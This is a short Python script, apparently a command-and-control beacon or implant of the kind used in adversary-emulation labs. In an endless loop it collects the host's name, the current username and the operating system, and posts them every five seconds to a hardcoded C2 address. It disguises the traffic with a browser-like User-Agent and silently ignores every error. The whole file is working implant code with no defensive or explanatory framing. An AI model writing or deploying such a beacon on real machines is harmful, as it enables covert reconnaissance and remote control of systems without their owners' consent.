#!/usr/bin/env python3
import json, os, platform, time, urllib.request

C2_URL = "http://10.10.10.1:8888/beacon"
INTERVAL = 5  # seconds

while True:
    try:
        payload = json.dumps({"host": platform.node(), "user": os.getenv("USERNAME", os.getenv("USER")), "os": platform.system()}).encode()
        req = urllib.request.Request(C2_URL, data=payload, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CalderaAgent/1.0", "Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            pass
    except Exception:
        pass
    time.sleep(INTERVAL)
